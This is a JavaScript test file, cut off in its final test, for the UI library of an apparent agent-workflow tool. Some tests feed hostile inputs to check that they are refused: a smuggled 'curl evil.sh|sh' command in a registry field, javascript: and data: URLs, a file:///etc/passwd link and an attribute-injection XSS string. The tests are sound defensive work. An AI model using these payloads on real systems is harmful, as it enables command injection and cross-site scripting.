// Tests for static/lib.js, run in CI with: node --test ui/lib.test.js
const test = require("node:test");
const assert = require("node:assert/strict");
const DD = require("../static/lib.js");

test("outputs that only look like answers or pages are plain text", () => {
  // Review 6: these blanked the whole page.
  for (const bad of ['{"pirn":1}', '{"pirn":1,"model":"m","text":{}}', '{"pirn":1,"model":"","text":"x"}',
    '{"pirn":1,"model":"m","text":"x","inputTokens":"9"}', '{"reed":1}', '{"reed":1,"url":"u","title":{}}',
    '{"reed":1,"url":"u","blocked":"x"}', '{"reed":1,"url":"u","allowed":[1]}', "null", "[]", '"str"', "7"]) {
    assert.deepEqual(DD.parse(bad), { text: bad }, bad);
    assert.equal(DD.preview(bad), bad);
    assert.doesNotThrow(() => DD.decisions("ask", bad));
  }
  assert.deepEqual(DD.parse(undefined), { text: "" });
});

test("real answers and pages are recognised", () => {
  const a = '{"pirn":1,"model":"claude-sonnet-5-5","text":"Yes [n0][n2][n0].","stopReason":"end_turn","inputTokens":4,"outputTokens":2}';
  assert.equal(DD.parse(a).answer.model, "claude-sonnet-5-5");
  assert.deepEqual(DD.decisions("ask", a), [["Model", "claude-sonnet-5-5"], ["Tokens", "4 in, 2 out"], ["Stopped", "on its own (end_turn)"], ["Cited", "[n0] [n2]"]]);
  const p = '{"reed":1,"url":"https://a.example/","title":"A","text":"hi","allowed":["a.example"],"blocked":["https://t.example/"],"blockedTotal":1}';
  assert.equal(DD.parse(p).page.title, "A");
  assert.equal(DD.preview(p), "A\nhi");
  assert.deepEqual(DD.decisions("browse", p), [["Ended at", "https://a.example/"], ["Allowed", "a.example"], ["Refused", "1 requests"]]);
});

test("an assessment's for and against come from their own lines", () => {
  // Review 6: /for:/ matched inside the claim.
  const out = "the cost for: supply will rise: SUPPORTED\n  for:     factory\n  against: carrier, weather\n";
  assert.deepEqual(DD.decisions("assess", out), [["Verdict", "the cost for: supply will rise: SUPPORTED"], ["For", "factory"], ["Against", "carrier, weather"]]);
});

test("durations never read 60 seconds", () => {
  // Review 6: 119.6 s printed as "1 min 60 s".
  assert.equal(DD.dur(119600), "2 min 0 s");
  assert.equal(DD.dur(61000), "1 min 1 s");
  assert.equal(DD.dur(999), "999 ms");
  assert.equal(DD.dur(1500), "1.5 s");
  for (const bad of [NaN, -1, undefined, Infinity]) assert.equal(DD.dur(bad), "");
});

test("a finished run's timeline ends at its last step, not now", () => {
  // Review 6: steps left open by a failed run stretched the axis to now.
  const steps = [
    { status: "Failed", scheduled: "2026-11-01T00:00:00Z", started: "2026-11-01T00:00:01Z", closed: "2026-11-01T00:00:05Z" },
    { status: "Running", scheduled: "2026-11-01T00:00:00Z", started: "2026-11-01T00:00:01Z" },
  ];
  const now = Date.parse("2026-11-02T00:00:00Z");
  const done = DD.span(steps, now, false);
  assert.equal(done.t1 - done.t0, 5000);
  const live = DD.span(steps, now, true);
  assert.equal(live.t1, now);
  for (const s of [DD.span([], now, true), DD.span([{ scheduled: "0001-01-01T00:00:00Z" }], now, false), DD.span([{ scheduled: "junk" }], now, false)]) {
    assert.ok(Number.isFinite(s.t0) && Number.isFinite(s.t1) && s.t1 > s.t0);
  }
});

test("ancestors follow requires and survive cycles and gaps", () => {
  const plan = { nodes: [{ id: "a" }, { id: "b", requires: ["a"] }, { id: "c", requires: ["b", "x"] }, { id: "d", requires: ["d", "c"] }] };
  assert.deepEqual([...DD.ancestors(plan, "c")].sort(), ["a", "b", "x"]);
  assert.deepEqual([...DD.ancestors(plan, "d")].sort(), ["a", "b", "c", "d", "x"]);
  assert.equal(DD.ancestors(undefined, "a").size, 0);
});

test("program tokens keep every character", () => {
  for (const src of ['(pipe (echo "a") echo)', '(ask "unterminated', '  ((( )) "\\"" x', "", "é ü\t\n(x)"]) {
    assert.equal(DD.tokens(src).map((t) => t[1]).join(""), src);
  }
});

// Roadmap 9.4: the page reads programs as draft does. TestInv_TokensAgreeWithDraft
// checks testdata/tokens.json against draft's reader; this checks the page.
test("the page splits every program in testdata/tokens.json as the corpus says", () => {
  const cases = JSON.parse(require("node:fs").readFileSync(require("node:path").join(__dirname, "../testdata/tokens.json"), "utf8"));
  assert.ok(cases.length >= 20);
  for (const c of cases) assert.deepEqual(DD.tokens(c.src), c.tokens, c.name);
  // Comments are their own tokens, never words and strings (the old tokenizer's mistake).
  assert.deepEqual(DD.tokens('; a "b" (c)'), [["comment", '; a "b" (c)']]);
  assert.deepEqual(DD.tokens('x // y "z"'), [["word", "x"], ["space", " "], ["comment", '// y "z"']]);
});

test("brackets pair by depth; brackets in strings and comments don't count; unmatched ones have no partner", () => {
  const at = (src) => DD.program(src).filter((t) => t.kind === "paren").map((t) => [t.text, t.depth, t.partner]);
  const p = DD.program('(pipe (par (echo "(") ; )\n x) echo)');
  const parens = p.map((t, i) => [t, i]).filter(([t]) => t.kind === "paren");
  assert.deepEqual(parens.map(([t]) => t.text + t.depth), ["(0", "(1", "(2", ")2", ")1", ")0"]);
  for (const [t, i] of parens) assert.equal(p[t.partner].partner, i);
  assert.deepEqual(at("(a))"), [["(", 0, 2], [")", 0, 0], [")", 0, -1]]);
  assert.deepEqual(at("((a)"), [["(", 0, -1], ["(", 1, 3], [")", 1, 1]]);
  assert.deepEqual(at(")("), [[")", 0, -1], ["(", 0, -1]]);
  assert.deepEqual(at('(echo "))" ; )\n)'), [["(", 0, 7], [")", 0, 0]]);
  // Heads and argument positions: a grant is an agent step's third form or later.
  const q = DD.program('(agent "go" "maps" "maps/directions" (x) "browse" "Bad!")');
  const grants = q.map(DD.grantOf).filter(Boolean);
  assert.deepEqual(grants, [{ connector: "maps", tool: "" }, { connector: "maps", tool: "directions" }, { connector: "browse", tool: "" }]);
  assert.equal(DD.grantOf(DD.program('(ask "maps")')[3]), null);
  assert.equal(DD.grantOf(DD.program('(agent "maps")')[3]), null, "the instruction is not a grant");
});

test("only http and https URLs become links; every other scheme stays text", () => {
  const urls = (s) => DD.links(s).filter((p) => p.url).map((p) => p.url);
  for (const hostile of ["javascript:alert(1)", "JavaScript:alert(1)", "data:text/html,<script>x</script>", "vbscript:x", "file:///etc/passwd",
    "//evil.example/x", "http://", "https://", "java\tscript:alert(1)", "ftp://x.org/", "blob:https://x.org/1", "mailto:a@b.c"]) {
    assert.deepEqual(urls(hostile), [], hostile);
    assert.equal(DD.links(hostile).map((p) => p.text).join(""), hostile);
  }
  assert.deepEqual(urls("see https://a.org/x_(y). Then HTTP://B.io/q?a=1, done"), ["https://a.org/x_(y)", "HTTP://B.io/q?a=1"]);
  assert.deepEqual(urls("javascript:alert(1)//https://x.org/"), [], "a URL starts a word");
  assert.deepEqual(urls("(https://x.org/a) 'https://y.org/'"), ["https://x.org/a", "https://y.org/"]);
  assert.deepEqual(urls('https://x.org/a"onmouseover=alert(1)'), ["https://x.org/a"]);
  for (const s of ["a https://x.org/ b", "(https://x.org/a)", "", "plain"]) assert.equal(DD.links(s).map((p) => p.text).join(""), s);
});

test("lines split pieces at line breaks and measure each line's indent", () => {
  const l = DD.lines([{ text: "(pipe\n  (a" }, { text: " \"b\nc\")", k: 1 }, { text: "\n\t(x)" }]);
  assert.deepEqual(l.map((x) => [x.pieces.map((p) => p.text).join(""), x.indent]), [["(pipe", 0], ['  (a "b', 2], ['c")', 0], ["\t(x)", 2]]);
  assert.equal(l[1].pieces[1].k, 1);
  assert.equal(DD.unquote('"a\\n\\"b"'), 'a\n"b');
  assert.equal(DD.unquote('"a\\q"'), null);
});

const agentJSON = (over) => JSON.stringify(Object.assign({ pirn: 1, agent: 1, model: "claude-sonnet-5-5", text: "Done.", image: "abc", turns: 2,
  commands: [{ command: "ls", exitCode: 0, stdout: "a", ms: 5 }, { command: "false", exitCode: 1, ms: 2 }],
  files: [{ path: "out.txt", size: 2, text: "hi" }], changes: [{ kind: "added", path: "/work/out/out.txt" }], inputs: { n0: "in/n0.txt" },
  stopReason: "end_turn", inputTokens: 20, outputTokens: 6 }, over));

test("agent results are recognised, and only well-formed ones", () => {
  const ok = agentJSON({});
  assert.equal(DD.parse(ok).agent.turns, 2);
  assert.equal(DD.preview(ok), "Done.");
  assert.deepEqual(DD.decisions("agent", ok), [["Model", "claude-sonnet-5-5"], ["Turns", "2"], ["Commands", "2 run, 1 failed"],
    ["Files kept", "out.txt"], ["Changed", "1 paths in the container"], ["Tokens", "20 in, 6 out"], ["Stopped", "on its own (end_turn)"]]);
  for (const bad of [agentJSON({ commands: "x" }), agentJSON({ commands: [{ command: 1, exitCode: 0 }] }), agentJSON({ files: [{ path: "a" }] }),
    agentJSON({ changes: [{ kind: "added" }] }), agentJSON({ inputs: { n0: 1 } }), agentJSON({ model: "" }), agentJSON({ agent: 2 }),
    // Review 7: a change kind like __proto__ broke the page's grouping.
    agentJSON({ changes: [{ kind: "__proto__", path: "/x" }] }), agentJSON({ changes: [{ kind: "renamed", path: "/x" }] }),
    agentJSON({ skippedMore: "3" }), agentJSON({ moreChanges: {} })]) {
    assert.deepEqual(DD.parse(bad), { text: bad });
    assert.doesNotThrow(() => DD.decisions("agent", bad));
  }
});

test("pirn's empty lists and counts are accepted", () => {
  const a = DD.parse(agentJSON({ commands: [], files: [], changes: [], skipped: ["big.bin (too large)"], skippedMore: 4, moreChanges: 2, inputs: {} })).agent;
  assert.ok(a);
  assert.deepEqual(DD.decisions("agent", JSON.stringify(a))[2], ["Commands", "0 run"]);
});

test("a step's recorded files are checked and summarised", () => {
  const b = (c) => c.repeat(40);
  const files = [
    { path: "new.txt", size: 5, status: "added", blob: b("a") },
    { path: "report.txt", size: 9, status: "changed", blob: b("b"), before: b("c") },
    { path: "keep.txt", size: 1, status: "same", blob: b("d"), before: b("d") },
    { path: "gone.txt", size: 3, status: "deleted", before: b("e") },
  ];
  assert.equal(DD.asFiles(files).length, 4);
  assert.equal(DD.fileSummary(files), "1 added, 1 changed, 1 the same, 1 deleted");
  for (const bad of [{ path: "x", size: 1, status: "renamed", blob: b("a") }, { path: "x", size: "1", status: "added", blob: b("a") },
    { path: "x", size: 1, status: "added" }, { path: "x", size: 1, status: "changed", blob: b("a") }, { path: "x", size: 1, status: "deleted", blob: b("a"), before: b("a") },
    { path: "x", size: 1, status: "added", blob: "../../api" }, { path: 1, size: 1, status: "added", blob: b("a") }, null, "x",
    // Review 9: 41 to 63 hex digits were accepted.
    { path: "x", size: 1, status: "added", blob: "a".repeat(41) }]) {
    assert.deepEqual(DD.asFiles([bad]), [], JSON.stringify(bad));
  }
  for (const v of [undefined, null, {}, "x"]) assert.deepEqual(DD.asFiles(v), []);
  assert.equal(DD.fileSummary([]), "");
});

test("sizes read in the largest fitting unit", () => {
  // Review 9: 5 MB read "5120.0 KiB".
  assert.equal(DD.size(0), "0 B");
  assert.equal(DD.size(1023), "1023 B");
  assert.equal(DD.size(1536), "1.5 KiB");
  assert.equal(DD.size(5 * 1024 * 1024), "5.0 MiB");
  assert.equal(DD.size(4 * 1024 ** 3), "4.0 GiB");
  for (const bad of [-1, NaN, undefined, "3"]) assert.equal(DD.size(bad), "");
});

test("files kept in a registry are recognised, and fetched as pirn says", () => {
  const sum = "ab".repeat(32);
  const ok = agentJSON({ files: [{ path: "big.bin", size: 3000000, oci: "ghcr.io/acme/files", sha256: sum }] });
  assert.equal(DD.parse(ok).agent.files[0].oci, "ghcr.io/acme/files");
  for (const bad of [{ path: "a", size: 1, oci: "r" }, { path: "a", size: 1, oci: "ghcr.io/acme/files", sha256: "AB" }, { path: "a", size: 1, sha256: sum },
    { path: "a", size: 1, oci: "ghcr.io/acme/files", sha256: sum, text: "x" },
    // Review 10: any string was accepted, and shown inside a command to copy.
    { path: "a", size: 1, oci: "x; curl evil.sh|sh; #", sha256: sum }, { path: "a", size: 1, oci: "r", sha256: sum },
    { path: "a", size: 1, oci: "ghcr.io/acme/files:v1", sha256: sum }, { path: "a", size: 1, oci: "-ghcr.io/a", sha256: sum }]) {
    assert.deepEqual(DD.parse(agentJSON({ files: [bad] })), { text: agentJSON({ files: [bad] }) }, JSON.stringify(bad));
  }
  // The same string pirn's TestInv_RegistryIsCheckedBeforeAnyContainer expects.
  assert.equal(DD.fetchCommand("ghcr.io/acme/files", "ab", "my report's.bin"), "oras blob fetch --output 'my report'\\''s.bin' ghcr.io/acme/files@sha256:ab");
  assert.equal(DD.fetchCommand("ghcr.io/acme/files", "ab", "-"), "oras blob fetch --output './-' ghcr.io/acme/files@sha256:ab");
});

test("skill nodes are recognised, and only real ones", () => {
  const v = "ab".repeat(20);
  assert.deepEqual(DD.skillOf({ activity: "Skill", args: ["weather", v, "Boston"] }), { name: "weather", version: v, args: ["Boston"] });
  for (const bad of [{ activity: "Agent", args: ["weather", v] }, { activity: "Skill", args: ["weather"] }, { activity: "Skill", args: ["Weather", v] },
    { activity: "Skill", args: ["weather", "HEAD"] }, { activity: "Skill", args: ["../x", v] }, { activity: "Skill" }, null]) {
    assert.equal(DD.skillOf(bad), null, JSON.stringify(bad));
  }
});

test("skills from the API are checked, and source links point only at GitHub", () => {
  const v = "ab".repeat(20), c = "cd".repeat(20);
  const ok = { name: "pdf", description: "Reads PDFs.", version: v, commit: v, source: { repo: "https://github.com/anthropics/skills", path: "skills/pdf", commit: c } };
  assert.ok(DD.asSkill(ok));
  assert.equal(DD.sourceLink(ok.source), `https://github.com/anthropics/skills/tree/${c}/skills/pdf`);
  for (const bad of [{ ...ok, name: "X" }, { ...ok, version: "1" }, { ...ok, description: 1 }, { ...ok, source: { repo: 1 } }, { ...ok, source: null }]) {
    assert.equal(DD.asSkill(bad), null, JSON.stringify(bad));
  }
  for (const bad of [{ repo: "https://gitlab.com/a/b", commit: c }, { repo: "javascript:alert(1)//github.com/a/b", commit: c },
    { repo: "https://github.com/a/b", commit: "main" }, { repo: "https://github.com/a/b", commit: c, path: "../../x" },
    { repo: "https://github.com/a/b/../../evil", commit: c }, { repo: "https://github.com.evil.example/a/b", commit: c }, null]) {
    assert.equal(DD.sourceLink(bad), null, JSON.stringify(bad));
  }
  assert.equal(DD.sourceLink({ repo: "file:///home/me/skills", commit: c }), null);
});

test("a review shows invisible characters as code points", () => {
  // Review 17: bidirectional overrides and zero-width spaces were shown as they are.
  assert.equal(DD.visible("a\u202eb\u200bc\u0000d\u001be"), "a⟨U+202E⟩b⟨U+200B⟩c⟨U+0000⟩d⟨U+001B⟩e");
  assert.equal(DD.visible("tab\tline\nemoji 👩\u200d💻 é"), "tab\tline\nemoji 👩\u200d💻 é");
  assert.equal(DD.visible("\u2066x\u2069\ufeff"), "⟨U+2066⟩x⟨U+2069⟩⟨U+FEFF⟩");
});

test("a picked folder becomes files by path, without hidden ones, within the limit", async () => {
  const f = (path, size = 3) => ({ webkitRelativePath: path, size });
  const read = async (x) => "b64:" + x.webkitRelativePath;
  const got = await DD.readFolder([f("pdf/SKILL.md"), f("pdf/scripts/x.py"), f("pdf/.DS_Store"), f("pdf/.git/HEAD")], read);
  assert.deepEqual(got.files, { "SKILL.md": "b64:pdf/SKILL.md", "scripts/x.py": "b64:pdf/scripts/x.py" });
  assert.equal(got.count, 2); assert.equal(got.skipped, 2);
  assert.match((await DD.readFolder([f("pdf/README.md")], read)).error, /no SKILL.md/);
  assert.match((await DD.readFolder([f("pdf/SKILL.md"), f("pdf/big.bin", DD.MAX_UPLOAD)], read)).error, /more than/);
  assert.equal(DD.base64("é ok"), Buffer.from("é ok").toString("base64"));
});

test("connector calls and writes are shown only when well formed", () => {
  const base = { pirn: 1, model: "m", text: "t", agent: 1, image: "i", turns: 1, commands: [], files: [], changes: [], inputs: {} };
  const ok = { ...base, grant: "mail", tools: [{ connector: "mail", tool: "send", input: "{}", write: "w1" }], writes: [{ id: "w1", connector: "mail", tool: "send", input: {} }] };
  assert.ok(DD.parse(JSON.stringify(ok)).agent);
  for (const bad of [{ ...ok, tools: [{ connector: "mail" }] }, { ...ok, tools: "x" }, { ...ok, writes: [{ id: 1 }] }, { ...ok, tools: [{ ...ok.tools[0], remote: "yes" }] }]) {
    assert.equal(DD.parse(JSON.stringify(bad)).agent, undefined, JSON.stringify(bad));
  }
  const w = { node: "n0", id: "w1", connector: "mail", tool: "send", input: { to: "a" }, status: "waiting" };
  assert.equal(DD.asWrites([w])[0].inputText, '{"to":"a"}');
  for (const bad of [[{ ...w, status: "sent" }], [{ ...w, node: 1 }], "x", [{ ...w, output: {} }]]) assert.deepEqual(DD.asWrites(bad), []);
});

test("a skill's connectors and creation are shown only as strings", () => {
  const sk = { name: "triage", description: "d", version: "a".repeat(40), commit: "b".repeat(40) };
  assert.ok(DD.asSkill({ ...sk, connectors: "linear/search mail", created: "Triage bugs." }));
  for (const bad of [{ ...sk, connectors: ["linear"] }, { ...sk, created: {} }]) assert.equal(DD.asSkill(bad), null);
});

test("a written program never loses the one it replaces", () => {
  // Review 20: describing a task overwrote the editor with no way back.
  assert.equal(DD.replaced("(echo \"mine\")", "(echo \"theirs\")"), "(echo \"mine\")");
  for (const [before, written] of [["", "(echo)"], ["  \n", "(echo)"], ["(echo)", "(echo)"], [undefined, "(echo)"]]) {
    assert.equal(DD.replaced(before, written), "", JSON.stringify(before));
  }
});

test("the calendar groups runs by the local day they started", () => {
  const at = (y, m, d, h) => new Date(y, m, d, h).toISOString();
  assert.equal(DD.dayKey(at(2026, 10, 2, 23)), "2026-11-02");
  for (const bad of ["", undefined, "not a time"]) assert.equal(DD.dayKey(bad), "");
  const runs = [
    { start: at(2026, 10, 2, 9), status: "Completed" }, { start: at(2026, 10, 2, 18), status: "Failed" },
    { start: at(2026, 10, 3, 1), status: "Running" }, { start: "", status: "Completed" },
  ];
  assert.deepEqual(DD.byDay(runs), {
    "2026-11-02": { runs: 2, failed: 1, running: 0 },
    "2026-11-03": { runs: 1, failed: 0, running: 1 },
  });
  assert.equal(DD.onDay(runs, "2026-11-02").length, 2);
  assert.equal(DD.onDay(runs, "").length, 4, "no day is every run");
});

test("a month grid is whole weeks, Monday first, covering every day once", () => {
  for (const [y, m] of [[2026, 10], [2026, 1], [2021, 1], [2026, 11]]) {
    const weeks = DD.monthGrid(y, m);
    const days = weeks.flat();
    assert.ok(weeks.every((w) => w.length === 7));
    assert.equal(new Date(days[0].key + "T12:00").getDay(), 1, `${y}-${m + 1} starts on a Monday`);
    const inMonth = days.filter((d) => d.inMonth).map((d) => d.day);
    assert.deepEqual(inMonth, Array.from({ length: new Date(y, m + 1, 0).getDate() }, (_, i) => i + 1));
    assert.ok(!weeks.at(-1).every((d) => !d.inMonth), "no week of only the next month");
  }
});

test("calendar days are readable: every tint has text at WCAG 4.5:1, in both themes", () => {
  // Review 23: white on mid tints was 2.5:1 in light mode, 3.4:1 in dark.
  const html = require("node:fs").readFileSync(__dirname + "/../static/index.html", "utf8");
  const themes = [...html.matchAll(/--surface:(#[0-9a-f]{6}); --sunk:(#[0-9a-f]{6}); --ink:(#[0-9a-f]{6})[\s\S]*?--record:(#[0-9a-f]{6})/gi)];
  assert.ok(themes.length >= 2, "light and dark palettes found");
  for (const [, surface, sunk, ink, record] of themes) {
    for (let share = 0; share <= 1.0001; share += 0.01) {
      const { bg, text } = DD.tint(share, record, sunk, ink, surface);
      assert.ok(DD.contrast(bg, text) >= 4.5, `${record} at ${share.toFixed(2)}: ${DD.contrast(bg, text).toFixed(2)}`);
    }
  }
  assert.equal(DD.contrast("#000000", "#ffffff").toFixed(0), "21");
});

test("the calendar's classes are its own, and merges and unknown times aren't runs", () => {
  // Review 23: days of other months used the run page's .out class.
  const app = require("node:fs").readFileSync(__dirname + "/../static/app.js", "utf8");
  const cal = app.slice(app.indexOf("function Calendar("), app.indexOf("const statusVar"));
  const classes = [...cal.matchAll(/class=\$?\{?"([^"]+)"|"(cal-[a-z-]*|[a-z-]+)"(?= :| \])/g)];
  const listed = cal.match(/const cls = \[([^\]]*)\]/)[1].match(/"([a-z-]*)"/g).map((x) => x.slice(1, -1)).filter(Boolean);
  for (const c of listed) assert.ok(c.startsWith("cal-"), `calendar class ${c} isn't cal- prefixed`);
  assert.ok(classes.length > 0);
  // Review 23: a chosen day that lost its runs was disabled, so it couldn't be cleared.
  assert.ok(cal.includes("disabled=${!c && d.key !== day}"), "the chosen day stays clickable");
  assert.deepEqual(DD.byDay([{ start: "2026-11-02T10:00:00Z", merged: "abc", status: "Recorded" }]), {});
  assert.equal(DD.dayKey("0001-01-01T00:00:00Z"), "");
});

test("a repository's listing keeps only well-formed entries", () => {
  const ok = { source: { repo: "https://github.com/anthropics/skills", path: "skills/pdf", commit: "a".repeat(40) }, name: "pdf", description: "Reads PDFs." };
  const bad = { source: { repo: "https://github.com/x/y", path: "skills/odd" }, problem: "its folder is \"odd\" but its name is \"other\"" };
  const c = DD.asCatalog({ entries: [ok, bad, null, { name: "x" }, { source: { repo: 7 }, name: "y" }, { source: { repo: "r" } }], omitted: 3 });
  assert.deepEqual(c, { entries: [ok, bad], omitted: 3 });
  for (const v of [null, {}, { entries: "x" }, { entries: [], omitted: -1 }, { entries: [], omitted: 1.5 }]) assert.equal(DD.asCatalog(v), null, JSON.stringify(v));
  assert.deepEqual(DD.asCatalog({ entries: [] }), { entries: [], omitted: 0 });
});

test("the API helper never throws, so no button is left busy", async () => {
  // Review 24: a failed fetch left "Listing…" and "Importing…" stuck.
  const down = await DD.request(() => Promise.reject(new TypeError("Failed to fetch")), "/api/x");
  assert.equal(down.ok, false); assert.equal(down.status, 0); assert.match(down.data.error, /couldn't reach drawdown: Failed to fetch/);
  const json = { ok: true, status: 200, headers: { get: () => "application/json" }, json: async () => ({ a: 1 }) };
  assert.deepEqual(await DD.request(async () => json, "/api/x", { b: 2 }), { ok: true, status: 200, data: { a: 1 } });
  const badJSON = { ok: true, status: 200, headers: { get: () => "application/json" }, json: async () => { throw new SyntaxError("bad"); } };
  assert.equal((await DD.request(async () => badJSON, "/api/x")).ok, false);
});

test("a listing says which skills share a name, and which would replace yours", () => {
  // Review 24: two folders named pdf imported over each other, silently.
  const e = (path, name, repo = "https://github.com/a/b") => ({ source: { repo, path }, name, description: "x" });
  const entries = [e("x/pdf", "pdf"), e("y/pdf", "pdf"), e("docx", "docx"), e("brief", "brief"), { source: { repo: "https://github.com/a/b", path: "bad" }, name: "pdf", problem: "no" }];
  const library = [{ name: "docx", source: { repo: "https://github.com/a/b", path: "docx" } }, { name: "brief" }];
  const n = DD.catalogNotes(entries, library);
  assert.ok(n["https://github.com/a/b#x/pdf"].dup && n["https://github.com/a/b#y/pdf"].dup);
  assert.equal(n["https://github.com/a/b#docx"], undefined, "the same skill from the same place replaces nothing new");
  assert.ok(n["https://github.com/a/b#brief"].replaces && /added by hand/.test(n["https://github.com/a/b#brief"].text));
  assert.equal(n["https://github.com/a/b#bad"], undefined);
});

// === Composition (roadmap 5.12) ===
const step = (node) => ({ kind: "step", node });
const plan3 = { nodes: [{ id: "n0" }, { id: "n1" }, { id: "n2", requires: ["n0", "n1"] }] };

test("a shape is drawn only if it names exactly the plan's steps, in order", () => {
  const good = { kind: "pipe", parts: [{ kind: "par", parts: [step("n0"), step("n1")] }, step("n2")] };
  assert.deepEqual(DD.composition(good, plan3), { shape: good, exact: true });
  const moved = { kind: "pipe", parts: [{ kind: "par", parts: [step("n1"), step("n0")] }, step("n2")] };
  const missing = { kind: "pipe", parts: [step("n0"), step("n2")] };
  for (const bad of [moved, missing, null, { kind: "pipe", parts: [step("n0")] }, { kind: "loop", parts: [] },
    { kind: "step", node: "" }, { kind: "step", node: "n0", parts: [] }, { kind: "pipe", parts: "n0" }]) {
    const c = DD.composition(bad, plan3);
    assert.equal(c.exact, false, JSON.stringify(bad));
    assert.deepEqual(c.shape, good, "falls back to the layers of requires");
  }
});

test("a shape nested too deep is refused, not walked", () => {
  let deep = step("n0");
  for (let i = 0; i < 100; i++) deep = { kind: "pipe", parts: [deep, step("x")] };
  assert.equal(DD.asShape(deep), null);
});

test("layers come from requires, including steps that wait across layers", () => {
  const p = { nodes: [{ id: "a" }, { id: "b", requires: ["a"] }, { id: "c", requires: ["a", "b"] }, { id: "d" }] };
  assert.deepEqual(DD.layered(p), { kind: "pipe", parts: [{ kind: "par", parts: [step("a"), step("d")] }, step("b"), step("c")] });
  assert.deepEqual(DD.layered({ nodes: [{ id: "a" }] }), step("a"));
  assert.equal(DD.layered({ nodes: [] }), null);
  assert.deepEqual(DD.flowsInto(p, ["a", "d", "b"], ["c"]), [{ from: "a", to: "c" }, { from: "b", to: "c" }]);
  assert.deepEqual(DD.flowsInto(p, ["d"], ["b"]), []);
});

test("every group has a key, and steps tally by status", () => {
  const sh = { kind: "pipe", parts: [{ kind: "par", parts: [step("n0"), step("n1")] }, step("n2")] };
  assert.deepEqual(DD.groupKeys(sh), ["0", "0.0"]);
  assert.deepEqual(DD.stepsOf(sh), ["n0", "n1", "n2"]);
  const st = { n0: "Completed", n1: "Failed" };
  assert.deepEqual(DD.tally(DD.stepsOf(sh), (id) => st[id]), { Completed: 1, Failed: 1, none: 1 });
});

// === Connectors (roadmap 7.2) ===
test("the Connectors page reads only well-formed data, and never a value", () => {
  const good = { file: "/h/connectors.json", keychain: true, anthropic: { name: "ANTHROPIC_API_KEY", from: "keychain" },
    connectors: [{ name: "maps", url: "https://maps.example/mcp", secrets: [{ name: "MAPS_KEY", from: "missing" }] },
      { name: "search", image: "i@sha256:aa", command: ["srv"], writes: ["post"], approve: true, secrets: [{ name: "K", from: "environment" }, { name: "L", from: "missing", error: "locked" }] }] };
  assert.deepEqual(DD.asConnectors(good), { ...good, unreadable: 0 });
  assert.equal(DD.keysMissing(DD.asConnectors(good)), 2);
  for (const bad of [null, {}, { ...good, connectors: "x" }, { ...good, anthropic: { name: "ANTHROPIC_API_KEY", from: "somewhere" } }]) {
    assert.equal(DD.asConnectors(bad), null, JSON.stringify(bad));
  }
  // One bad entry is left out and counted; the rest, and Claude's key, stay (review 27).
  for (const entry of [{ name: "m", secrets: [{ name: "bad name", from: "keychain" }] }, { name: "m", secrets: [{ name: "K", from: "keychain" }], tools: [1] },
    { name: 7, secrets: [] }, null, "x"]) {
    const v = DD.asConnectors({ ...good, error: "connector \"m\": bad", connectors: [...good.connectors, entry] });
    assert.equal(v.connectors.length, 2, JSON.stringify(entry));
    assert.equal(v.unreadable, 1);
    assert.equal(v.anthropic.from, "keychain");
  }
});

test("a registry page keeps only servers it can show safely", () => {
  const ready = { name: "io.github.acme/maps-mcp", description: "Places", fit: "ready", url: "https://maps.acme.dev/mcp", suggest: "maps", link: "https://github.com/acme/maps" };
  const no = { name: "a/b", description: "d", fit: "no", why: "Can't be added here: it needs the header X-API-Key.", suggest: "b" };
  const v = DD.asRegistryPage({ servers: [ready, no,
    { ...ready, url: "javascript:alert(1)" }, { ...ready, url: "http://x.dev/mcp" }, { ...ready, link: "javascript:x" },
    { ...no, why: undefined }, { ...ready, fit: "maybe" }, null, { ...ready, name: 3 }], next: "c2" });
  assert.deepEqual(v.servers, [ready, no]);
  assert.equal(v.next, "c2");
  assert.equal(v.hidden, 7);
  assert.equal(DD.asRegistryPage({ servers: "x" }), null);
});

test("a suggested name is free and short enough; tokens get the server's name", () => {
  assert.equal(DD.freeName("maps", ["maps", "maps-2"]), "maps-3");
  const long = "a".repeat(24);
  const n = DD.freeName(long, [long]);
  assert.ok(n.length <= 24 && n !== long && /^[a-z0-9]([a-z0-9-]{0,22}[a-z0-9])?$/.test(n), n);
  assert.equal(DD.tokenName("travel-guide"), "HEEDLE_CONNECTOR_TRAVEL_GUIDE_TOKEN");
});

test("a sign-in only ever opens an https:// page", () => {
  assert.equal(DD.signInURL("https://auth.example.dev/authorize?x=1"), "https://auth.example.dev/authorize?x=1");
  for (const bad of ["javascript:alert(1)", "http://evil.dev/authorize", "data:text/html,x", "https://a b", "//evil.dev", null, 3]) {
    assert.equal(DD.signInURL(bad), "", String(bad));
  }
});

// === Schedules (roadmap 7.3) ===
test("schedules show only well-formed ones, and say when in words", () => {
  const good = { name: "digest", program: "(echo \"x\")", ref: "refs/loom/runs", spec: { every: 86400e9 }, paused: false, next: ["2026-11-04T09:00:00Z"],
    recent: [{ workflowId: "loom-abc-2026-11-03T09:00:00Z", runId: "r1", at: "2026-11-03T09:00:01Z" }] };
  assert.deepEqual(DD.asSchedules({ schedules: [good, { ...good, name: "Bad Name" }, { ...good, recent: [{ workflowId: "../x y", runId: "r", at: "t" }] }, { ...good, paused: "no" }, null] }), [good]);
  assert.deepEqual(DD.asSchedules({}), []);
  assert.equal(DD.when({ every: 86400e9 }), "every day");
  assert.equal(DD.when({ every: 3 * 3600e9 }), "every 3 hours");
  assert.equal(DD.when({ every: 60e9 }), "every minute");
  assert.equal(DD.when({ every: 90 * 60e9 }), "every 90 minutes");
  assert.equal(DD.when({ cron: "0 9 * * 1-5", timeZone: "Europe/Lisbon" }), "every weekday at 9:00 (Europe/Lisbon)");
});

test("a step's failure says which connector or key to set up", () => {
  const askedFor = (asked, got, has) => `pirn: setup: the step asks for "${asked}", but this worker grants only "${got}" of it (its connectors: "${has}")`;
  assert.deepEqual(DD.connectorProblem(askedFor("maps search", "search", "search")), { missing: ["maps"] });
  assert.deepEqual(DD.connectorProblem(askedFor("maps/directions search/web", "", "")), { missing: ["maps", "search"] });
  // review 31: a connector the worker has, with fewer tools, isn't missing.
  assert.deepEqual(DD.connectorProblem(askedFor("maps/directions", "", "maps/search")), { tools: ["maps"] });
  const needs = (c, k) => `pirn: setup: connector "${c}" needs ${k}: store it with \`heedle secret set ${k}\` (or \`loom secret set ${k}\`), or set it where the worker runs`;
  assert.deepEqual(DD.connectorProblem(needs("maps", "HEEDLE_CONNECTOR_MAPS_TOKEN")), { connector: "maps", key: "HEEDLE_CONNECTOR_MAPS_TOKEN" });
